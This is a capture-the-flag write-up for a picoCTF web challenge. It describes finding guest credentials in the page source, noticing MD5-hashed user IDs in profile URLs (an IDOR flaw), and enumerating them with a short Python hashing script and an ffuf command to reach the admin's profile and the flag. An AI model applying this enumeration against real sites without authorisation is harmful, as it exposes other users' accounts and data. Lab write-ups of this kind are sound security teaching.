<img width="899" height="738" alt="image" src="https://github.com/user-attachments/assets/9b18b3f8-4518-4806-9c9d-5772849bfc88" />

\- Access the website, I found a credentials in the page source: `Email: guest@picoctf.org Password: guest`

\- After logging in, I noticed a suspicious string in the URL 
```
http://crystal-peak.picoctf.net:52345/profile/user/e93028bdc1aacdfb3687181f2031765d
```
\- Based on the description and title, I can confirm that this string is hashed, and the vulnerability is IDOR (keyword: **directly**)

\- Once I md5-decrypt the string in the URL, I found that it corresponds to my user ID (3000)

\- This indicates that the application likely uses:
  `MD5(user_id)` as the identifier in the URL

<img width="1249" height="342" alt="image" src="https://github.com/user-attachments/assets/aac4a1d2-5660-4418-81b4-828983ffb306" />

\- To escalate privileges, I generated my own wordlist *(hash_list.txt)* of md5 hashes for user IDs from 0 to 5000, which may include the admin's ID
```
import hashlib

for i in range(0, 5000):
    h = hashlib.md5(str(i).encode()).hexdigest()
    print(h)
```

\- Using ffuf to scan other user, including admin 
```
ffuf -u http://crystal-peak.picoctf.net:52345/profile/user/FUZZ -w hash_list.txt -fc 404
```

<img width="1161" height="601" alt="image" src="https://github.com/user-attachments/assets/6130556a-15a9-48fb-aff4-79a2092b6af8" />

\- Replace the original hash in the URL with the new one that we found and successfully retrieve the flag 😍

